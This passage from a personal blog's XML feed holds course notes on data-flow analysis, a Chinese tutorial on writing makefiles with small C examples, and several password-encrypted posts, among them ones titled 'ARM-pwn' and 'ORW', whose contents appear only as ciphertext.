alt="image-20210316162556579"></p><p><img src="/2021/05/03/static-program/image-20210316163402058.png" alt="image-20210316163402058"></p><h3 id="Transfer-Function"><a href="#Transfer-Function" class="headerlink" title="Transfer Function"></a>Transfer Function</h3><ul><li>forward</li><li>backward</li></ul><p><img src="/2021/05/03/static-program/image-20210316164525008.png" alt="image-20210316164525008"></p><h3 id="Control-Flow"><a href="#Control-Flow" class="headerlink" title="Control Flow"></a>Control Flow</h3><p><img src="/2021/05/03/static-program/image-20210316165009528.png" alt="image-20210316165009528"></p><h2 id="2-Reaching-Definitions-Analysis"><a href="#2-Reaching-Definitions-Analysis" class="headerlink" title="2. Reaching Definitions Analysis"></a>2. Reaching Definitions Analysis</h2><h3 id="definition"><a href="#definition" class="headerlink" title="definition"></a>definition</h3><p><img src="/2021/05/03/static-program/image-20210316165640682.png" alt="image-20210316165640682"></p><h3 id="understanding"><a href="#understanding" class="headerlink" title="understanding"></a>understanding</h3><p>Focus on definition</p><p>transfer Function</p><ul><li>generate a definition</li><li>kill other definition</li></ul><p>control flow</p><p><img src="/2021/05/03/static-program/image-20210316171733031.png" alt="image-20210316171733031"></p><p><strong>eg</strong></p><p><img src="/2021/05/03/static-program/image-20210316172331897.png" alt="image-20210316172331897"></p><h3 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h3><p>这里有两个点需要看一下</p><ol><li>为什么OUT[entry]=空？因为入口处并未定义。此外，为什么不把OUT[entry]放入for循环中？因为要有一个模板生成算法</li><li>下面这个while中for循环的停止条件在哪里？</li></ol><p><img src="/2021/05/03/static-program/image-20210316172851109.png" alt="image-20210316172851109"></p><p><strong>eg</strong></p><p>how  CFG transfer to SourceCode？</p><p><img src="/2021/05/03/static-program/image-20210316173536011.png" alt="image-20210316173536011"></p><p>next,we will see the changes on the OUT[].</p><p>we should focus on two points</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IN[B] &#x3D; union(p a predecessor of B OUT[P]);</span><br><span class="line">OUT[B] &#x3D; genB(IN[B]-killB);</span><br></pre></td></tr></table></figure><p>until no changes occur on OUT</p><p><img src="/2021/05/03/static-program/image-20210316223814163.png" alt="image-20210316223814163"></p><p>There are two sentences.</p><p>This is very important</p><p>In each data-flow analysis application, we associate with every program point a <strong>data-flow value</strong> that represents an <strong>abstraction</strong> of the set of all possible <strong>program states</strong> that can be observed for the point.</p><p>Data-flow analysis is to <strong>find a solution</strong> to a set of <strong>safe-approximation</strong> directed constraints on the IN’s and OUT’s,for all statements.</p><p>And why this algorithm can stop?</p><p><img src="/2021/05/03/static-program/image-20210316225904275.png" alt="image-20210316225904275"></p><h2 id="3-Live-Variables-Analysis"><a href="#3-Live-Variables-Analysis" class="headerlink" title="3. Live Variables Analysis"></a>3. Live Variables Analysis</h2><h3 id="definition-1"><a href="#definition-1" class="headerlink" title="definition"></a>definition</h3><p><img src="/2021/05/03/static-program/image-20210316230830828.png" alt="image-20210316230830828"></p><h3 id="understanding-1"><a href="#understanding-1" class="headerlink" title="understanding"></a>understanding</h3><p>Focus on variables</p><p><img src="/2021/05/03/static-program/image-20210316231409321.png" alt="image-20210316231409321"></p><p><img src="/2021/05/03/static-program/image-20210317170644795.png" alt="image-20210317170644795"></p><h3 id="algorithm-1"><a href="#algorithm-1" class="headerlink" title="algorithm"></a>algorithm</h3><p><img src="/2021/05/03/static-program/image-20210317171158537.png" alt="image-20210317171158537"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IN[B] &#x3D; useB union (OUT[B]-defB)</span><br><span class="line">OUT[B] &#x3D; union s a successor of B IN[S]</span><br></pre></td></tr></table></figure><p><img src="/2021/05/03/static-program/image-20210317173026174.png" alt="image-20210317173026174"></p><h2 id="4-Available-Expressions-Analysis"><a href="#4-Available-Expressions-Analysis" class="headerlink" title="4. Available Expressions Analysis"></a>4. Available Expressions Analysis</h2><h3 id="definition-2"><a href="#definition-2" class="headerlink" title="definition"></a>definition</h3><p><img src="/2021/05/03/static-program/image-20210317173623458.png" alt="image-20210317173623458"></p><h3 id="understanding-2"><a href="#understanding-2" class="headerlink" title="understanding"></a>understanding</h3><p>Focus on expressions</p><p><img src="/2021/05/03/static-program/image-20210317174047841.png" alt="image-20210317174047841"></p><p><img src="/2021/05/03/static-program/image-20210317175430257.png" alt="image-20210317175430257"></p><h3 id="algorithm-2"><a href="#algorithm-2" class="headerlink" title="algorithm"></a>algorithm</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OUT[B] &#x3D; genB union (IN[B]-killB)</span><br><span class="line">IN[B] &#x3D; 交 P a predecessor of B OUT[P]</span><br></pre></td></tr></table></figure><p><img src="/2021/05/03/static-program/image-20210317194602113.png" alt="image-20210317194602113"></p><h2 id="5-Analysis-Comparison"><a href="#5-Analysis-Comparison" class="headerlink" title="5. Analysis Comparison"></a>5. Analysis Comparison</h2><p><img src="/2021/05/03/static-program/image-20210317195618231.png" alt="image-20210317195618231"></p><h1 id="0x04-Data-Flow-Analysis-Foundations"><a href="#0x04-Data-Flow-Analysis-Foundations" class="headerlink" title="0x04 Data-Flow-Analysis Foundations"></a>0x04 Data-Flow-Analysis Foundations</h1><h2 id="1-Iterative-Algorithm"><a href="#1-Iterative-Algorithm" class="headerlink" title="1. Iterative Algorithm"></a>1. Iterative Algorithm</h2><p><strong>why</strong></p><p>This has a fixed point.</p><p><img src="/2021/05/03/static-program/image-20210317202238222.png" alt="image-20210317202238222"></p><h2 id="2-Partial-Order"><a href="#2-Partial-Order" class="headerlink" title="2. Partial Order"></a>2. Partial Order</h2><h2 id="3-Lattice"><a href="#3-Lattice" class="headerlink" title="3. Lattice"></a>3. Lattice</h2><h2 id="4-Data-Flow-Analysis-Framework-via-Lattice"><a href="#4-Data-Flow-Analysis-Framework-via-Lattice" class="headerlink" title="4. Data Flow Analysis Framework via Lattice"></a>4. Data Flow Analysis Framework via Lattice</h2><p><img src="/2021/05/03/static-program/image-20210317205624533.png" alt="image-20210317205624533"></p><h2 id="5-Relate-Iterative-Algorithm-to-Fixed-Point-Theorem"><a href="#5-Relate-Iterative-Algorithm-to-Fixed-Point-Theorem" class="headerlink" title="5. Relate Iterative Algorithm to Fixed-Point Theorem"></a>5. Relate Iterative Algorithm to Fixed-Point Theorem</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-Static-Program-Analysis&quot;&gt;&lt;a href=&quot;#0x01-Static-Program-Analysis&quot; class=&quot;headerlink&quot; title=&quot;0x01 Static Program Analysis&quot;&gt;&lt;/a&gt;0x</summary>
      
    
    
    
    
    <category term="Course" scheme="https://pz1o.top/tags/Course/"/>
    
  </entry>
  
  <entry>
    <title>Database review</title>
    <link href="https://pz1o.top/2021/05/03/Database-review/"/>
    <id>https://pz1o.top/2021/05/03/Database-review/</id>
    <published>2021-05-03T08:12:11.000Z</published>
    <updated>2021-05-03T08:28:25.840Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19C+ut0lbZRmPlftMmoc8pQOu2RIwtgvAkjrEG/cmcsaVwIDACuHTYxzkzEZKyS3oVqXl61ZNjqtCRsfXWdwX1yiWi+Zh/+vbbQXpT0qeaM5Wa3oIXHJJXURIPo9ufNg1hpCJRorYBJN6Rvdj5Ejg1W/mzaIk+lXbOfEDqwF4Ih1jOSaZ2jZXLLTKgMKe09TaIw4vXd5qFxlgAh1NwEDJfb6laevYpgm9LD8PiPa+Je4ditdEsoejnBVW3ds8+mLFMYNw1qy8gScfmyzbkTPqi0p5l+xYEXP/+yDeHkvBocICWtemeo3hu8RAP+tVoBh+8ilhtRrJjxEmq8Rfp5mN8p0swOm11N8b3xE6Y3Y0TH/uc8SfJEia1JmcUbHpoFPmPyynQGOfHjDvYeLYME10hM+TW2wlQKj4K/yh2roVlSMnox+H6NeixmO7MnyOpraPuy9WwzlvtGN3J3IEZmdj3ZivjWYsh7C5kjlm01XIX+Llx4fUmiey89cQSbSOX91gR1KPD34NgJvdp17X/u8vuIJ4hrRnMue2jtaPYZBcyfOr/2tvBiMEl1T5bYst2Ii8ptMLYUY0dym9IP6dyKkEMvqjPiaWtrQDBDVu/rWdUVpuPw5rh45N4KeSmqWSfhBubuuWzSbcFT3fMhGytgBsjWxTGAI3Zt5i9HmpONPaXrg+ofV3wuF9wgdDfuUUtNpm4hp8tegmjO+5+VQuksU1VUteWAjuoQh6i/Zc1mZmRNtWtGpsDAUquTWiZ2YxmdocOxxcxR9hqFbFPV5d26WicL+4jknxZmR1eNejhqZKIM9bJRpolxVjMqnOnMlJ1OvqKrpY3dOg8D3n6b4qVRKW4gzjQDeA6Dy++1f9cvVK74abBpfcLfU2K364JB5yO8ey24yWBDILjLpsCIPjfZc6LhNRtMEDiuE9DAl6qbRr0KGDeRFx2w+SYs+mktds0LWeISYUsZQxBgYj0tdv3ZGldMFbD6jiXM6v1b86jC2ULxKPvkA0Tb9rdD9Qxxo2aGvF9Kj9/8ym/2gMAcGtCyqBCg5BiFoVLctfZrFEbGvY4CxKJr/Nm8R9ErKIW0sPoAeSZTOQxCn70MDFEkbvQG0Vgy6hN03QSJ6T8C3F+WhxxbstK+M6KZw41wV1MP5QrO6x0xqOJXGz32WeNONTLy9YPRkna/fDQbp2AqLMcI0cCVwvcJ6Ou/bz4HxjxGOOqxiCBaUlwWHrb7HIyLF5f4ittG3VsTkA+4PufZMoZKrsRsW6kEzniS+mhrR30jI4HMMmZPhh2IkJ47hJKV+jUz1pGZ4fl/HtmOJ3TToRoPzoeJ96GPJFbXwjxp7PmQTURkSOFPXd3LIrHVkKXKN3JTAyZOWHa+SnmLKtL/D8d8k2pPTl4Aw/OkiSl9Zeh8KoaWwPjOJuBIwubBZg== </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="Course" scheme="https://pz1o.top/tags/Course/"/>
    
  </entry>
  
  <entry>
    <title>makefile</title>
    <link href="https://pz1o.top/2021/04/30/makefile/"/>
    <id>https://pz1o.top/2021/04/30/makefile/</id>
    <published>2021-04-30T09:13:37.000Z</published>
    <updated>2021-04-30T10:29:50.433Z</updated>
    
    <content type="html"><![CDATA[<p>懒狗必备，makefile</p><p>为什么要写makefile，因为懒</p><h1 id="0x01-简单makefile编写"><a href="#0x01-简单makefile编写" class="headerlink" title="0x01 简单makefile编写"></a>0x01 简单makefile编写</h1><p><strong>makefile的基本格式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">target : dependency_files ##dependency_files是依赖的文件</span><br><span class="line">command #注意是一个TAB</span><br><span class="line">hello.o:hello.c hello.h</span><br><span class="line">gcc -c hello.c -o hello.o</span><br></pre></td></tr></table></figure><p>eg：</p><p>这里有四个文件 <code>demo1.c</code> <code>demo2.c</code> <code>main.c</code> <code>head.h</code>四个文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//demo1.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print1</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"this is demo1"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//demo2.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print2</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"this is demo2"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//head.h</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print1</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print2</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//main.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"head.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    print1();</span><br><span class="line">    print2();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"it is end"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//makefile</span></span><br><span class="line">demo:demo1.o demo2.o main.o</span><br><span class="line">    gcc demo1.o demo2.o main.o -o demo</span><br><span class="line">demo1.o:demo1.c</span><br><span class="line">    gcc demo1.c -Wall -c -o demo1.o</span><br><span class="line">demo2.o:demo2.c</span><br><span class="line">    gcc demo2.c -Wall -c -o demo2.o</span><br><span class="line">main.o:main.c</span><br><span class="line">   gcc main.c -Wall -c -o main.o</span><br><span class="line">clean:</span><br><span class="line">rm *.o demo</span><br><span class="line">        </span><br><span class="line">[<span class="number">17</span>:<span class="number">34</span>:<span class="number">25</span>] pz1o:make_demo $ make      </span><br><span class="line">gcc demo1.c -Wall -c -o demo1.o</span><br><span class="line">gcc demo2.c -Wall -c -o demo2.o</span><br><span class="line">gcc main.c -Wall -c -o main.o</span><br><span class="line">gcc demo1.o demo2.o main.o -o demo</span><br><span class="line">[<span class="number">17</span>:<span class="number">34</span>:<span class="number">28</span>] pz1o:make_demo $ ./demo </span><br><span class="line"><span class="keyword">this</span> is demo1</span><br><span class="line"><span class="keyword">this</span> is demo2</span><br><span class="line">it is <span class="built_in">end</span>%</span><br></pre></td></tr></table></figure><h1 id="0x02-变量"><a href="#0x02-变量" class="headerlink" title="0x02 变量"></a>0x02 变量</h1><p>变量的命名字可以包含字符、数字，下划线（可以是数字开头），但不应该含有“:”、“#”、“=”或是空字符（空格、回车等）。变量是区分英文字母大小写的。</p><p>预定义变量</p><ul><li>AR    库文件维护程序名称，默认为ar.AS汇编程序名称，默认值为as。</li><li>CC    C编译器的名称，默认为cc。CPP C预编译器的名称，默认值为$(CC) -E</li><li>CXX    C++编译器的名称，默认为g++</li><li>FC    FORTRAN编译器的缩写，默认值为f77</li><li>RM    文件删除程序名称，默认为rm -f</li></ul><p>自动变量</p><p>变量名    变量含义</p><ul><li>$*    不包含扩展名的目标文件名称</li><li>$+    所有的依赖文件，以空格分开，并以出现后的先后为序，可能包含重复依赖文件</li><li>$&lt;    第一个依赖文件的名称</li><li>$?    所有时间戳比目标文件晚的依赖文件，并以空格分开目标文件的完整名称</li><li>$@    目标文件的完整名称</li><li>$^    所有不重复的目标依赖文件，以空格分开</li><li>$%    如果目标是归档成员，则该变量表示目标的归档成员的目标名称</li></ul><p>makefile编写</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GCCFLAGS=-c -Wall</span><br><span class="line">OBJS=demo1.o demo2.o main.o</span><br><span class="line"><span class="section">demo:<span class="variable">$(OBJS)</span></span></span><br><span class="line">        gcc  <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">demo2.o:demo2.c</span></span><br><span class="line">        gcc <span class="variable">$(GCCFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">demo1.o:demo1.c</span></span><br><span class="line">        gcc <span class="variable">$(GCCFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">main.o:main.c</span></span><br><span class="line">        gcc <span class="variable">$(GCCFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>:clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        rm *.o demo</span><br></pre></td></tr></table></figure><p>改进版的makefile</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GCCFLAGS=-c -Wall</span><br><span class="line">OBJS=demo1.o demo2.o main.o</span><br><span class="line">TARGET=./demo</span><br><span class="line"><span class="section">%.o:%.c</span></span><br><span class="line">        <span class="variable">$(CC)</span> <span class="variable">$(GCCFLAGS)</span> -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(OBJS)</span></span><br><span class="line">        <span class="variable">$(CC)</span>  <span class="variable">$^</span> -o <span class="variable">$@</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        <span class="variable">$(RM)</span> *.o demo</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;懒狗必备，makefile&lt;/p&gt;
&lt;p&gt;为什么要写makefile，因为懒&lt;/p&gt;
&lt;h1 id=&quot;0x01-简单makefile编写&quot;&gt;&lt;a href=&quot;#0x01-简单makefile编写&quot; class=&quot;headerlink&quot; title=&quot;0x01 简单makef</summary>
      
    
    
    
    
    <category term="c" scheme="https://pz1o.top/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>ARM-pwn</title>
    <link href="https://pz1o.top/2021/04/29/arm-pwn/"/>
    <id>https://pz1o.top/2021/04/29/arm-pwn/</id>
    <published>2021-04-29T07:35:08.000Z</published>
    <updated>2021-05-03T11:35:59.001Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ORW</title>
    <link href="https://pz1o.top/2021/04/28/ORW/"/>
    <id>https://pz1o.top/2021/04/28/ORW/</id>
    <published>2021-04-28T07:32:57.000Z</published>
    <updated>2021-04-28T12:34:42.837Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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